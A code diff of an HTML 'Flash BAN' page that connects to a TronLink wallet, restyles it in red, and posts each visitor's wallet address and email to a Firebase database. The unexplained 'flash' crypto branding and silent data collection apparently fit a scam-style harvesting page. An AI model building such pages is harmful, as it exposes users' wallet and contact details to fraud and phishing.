@@ -3,53 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash Ban v1.0 connection to DEFI Wallet</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronlink-web3"></script> <!-- TronLink library -->
+    <title>Flash BAN 11.0 Connection to DEFI Network</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronlink-web3"></script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
+            background-color: white;
+            color: rgb(255, 0, 19);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
         .container {
             max-width: 600px;
-            margin: 50px auto;
             padding: 20px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
+            border-radius: 12px;
             text-align: center;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            background: white;
+            box-shadow: 0px 0px 15px rgba(255, 0, 19, 0.5);
+            border: 2px solid rgb(255, 0, 19);
         }
         input {
-            padding: 10px;
-            margin-bottom: 10px;
+            padding: 12px;
+            margin-bottom: 15px;
             width: 100%;
-            border-radius: 5px;
-            border: 1px solid #ccc;
+            border-radius: 6px;
+            border: 1px solid rgb(255, 0, 19);
+            outline: none;
         }
         button {
-            padding: 10px 20px;
+            padding: 12px 20px;
             width: 100%;
-            border-radius: 5px;
+            border-radius: 6px;
             border: none;
             cursor: pointer;
             font-size: 16px;
+            background-color: rgb(255, 0, 19);
+            color: white;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background-color: white;
+            color: rgb(255, 0, 19);
+            border: 2px solid rgb(255, 0, 19);
         }
         #statusMessage {
             margin-top: 20px;
             font-size: 14px;
-            color: red;
+            color: rgb(255, 0, 19);
         }
         #walletAddress {
             margin-top: 20px;
             font-size: 16px;
-            color: green;
+            font-weight: bold;
+            color: rgb(255, 0, 19);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Flash BAN v1.0.0.1 connection to DEFI Wallet</h1>
+        <h1>Flash BAN v1.0.0.1</h1>
         <input type="email" id="emailInput" placeholder="Enter your email" required>
-        <button id="connectButton">Connect to TronLink</button>
+        <button id="connectButton">CONNECT</button>
         <div id="walletAddress"></div>
         <div id="statusMessage"></div>
     </div>
@@ -58,29 +75,24 @@
         let provider;
         let connectedAddress = null;
         let isConnecting = false;
-        let email = document.getElementById('emailInput').value;
 
-        // Handle Connect Button Click
         document.getElementById('connectButton').addEventListener('click', async function () {
             if (isConnecting) return;
             isConnecting = true;
             document.getElementById('connectButton').textContent = 'Connecting...';
-            document.getElementById('connectButton').style.backgroundColor = '#f0ad4e';
+            document.getElementById('connectButton').style.backgroundColor = 'rgb(255, 165, 0)';
 
             if (typeof window.tronLink !== 'undefined') {
                 try {
-                    // Use TronLink's provider
                     provider = window.tronLink.tronWeb;
-
-                    // Request account from TronLink
                     const accounts = await provider.request({ method: 'tron_requestAccounts' });
                     connectedAddress = accounts[0];
 
                     document.getElementById('connectButton').textContent = 'Wallet Connected';
-                    document.getElementById('connectButton').style.backgroundColor = '#28a745';
+                    document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';
                     document.getElementById('walletAddress').textContent = `Connected Address: ${connectedAddress}`;
 
-                    // Send data to Firebase
+                    const email = document.getElementById('emailInput').value;
                     const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(connectedAddress)}.json`;
                     const jsonData = JSON.stringify({ email });
 
@@ -91,13 +103,10 @@
                         },
                         body: jsonData
                     });
-
                 } catch (error) {
                     document.getElementById('statusMessage').textContent = "TronLink connection failed.";
                     document.getElementById('connectButton').textContent = 'Connect to TronLink';
-                    document.getElementById('statusMessage').textContent = "Tron wallet connection failed.";
-                    document.getElementById('connectButton').textContent = 'Connect Wallet';
-                    document.getElementById('connectButton').style.backgroundColor = '#f6851b';
+                    document.getElementById('connectButton').style.backgroundColor = 'rgb(255, 0, 19)';
                 }
             } else {
                 document.getElementById('statusMessage').textContent = "TronLink is not installed!";
